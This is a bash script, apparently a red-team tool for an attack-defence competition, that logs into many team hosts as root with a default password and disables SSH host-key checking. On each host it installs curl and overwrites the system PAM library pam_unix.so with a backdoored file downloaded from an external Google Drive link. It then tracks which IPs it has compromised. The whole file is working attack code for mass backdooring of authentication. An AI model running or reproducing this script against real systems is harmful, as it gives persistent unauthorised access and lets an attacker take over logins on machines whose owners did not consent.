#!/bin/bash

IPs=()
network_id="10.20"
number_of_teams=10
host_ids=(111 121 131)
admin="root"
default_password="Password1!"
timeout_duration=2
path_to_pam="/usr/lib/x86_64-linux-gnu/security"
backdoor_link="https://drive.usercontent.google.com/download?id=1eH1xIVb6dwKrA4Q_Ji3lzmYkxPiM2pUm&export=download&authuser=0"
touch backdoored_IPs.txt

send_backdoor() {
    export default_password timeout_duration admin path_to_pam backdoor_link
    printf "%s\n" "${IPs[@]}" | xargs -P 20 -I {} bash -c '
        IP="{}"
        sshpass -p "$default_password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout_duration "$admin@$IP" "
            echo \"$default_password\" | sudo -S apt install curl -y
            echo \"$default_password\" | sudo -S curl -o \"$path_to_pam/pam_unix.so\" \"$backdoor_link\"
        "
        if [[ $? -eq 0 ]]; then
            echo "$IP" >> backdoored_IPs.txt
            echo "Backdoor successfully implanted at $IP"
        fi
    '
}

print_backdoored_IPs() {
    echo "Backdoored IPs:"
    cat backdoored_IPs.txt
}

print_unbackdoored_IPs() {
    echo "Unbackdoored IPs:"
    for IP in "${IPs[@]}"; do
        if ! grep -q "$IP" backdoored_IPs.txt; then
            echo "$IP"
        fi
    done
}

main() {
    for ((team=1; team<=number_of_teams; team++)); do
        for host_id in "${host_ids[@]}"; do
            IPs+=("$network_id.$team.$host_id")
        done
    done

    while true; do
        echo "DAKOTA CONQUEST SCRIPTS"
        echo "1. Send Backdoor"
        echo "2. Print Backdoored IPs"
        echo "3. Print Unbackdoored IPs"
        echo "4. Exit"
        read -p "Choose an option: " choice

        case $choice in
            1) send_backdoor ;;
            2) print_backdoored_IPs ;;
            3) print_unbackdoored_IPs ;;
            4) break ;;
            *) echo "Invalid choice. Please try again." ;;
        esac
    done
}

main
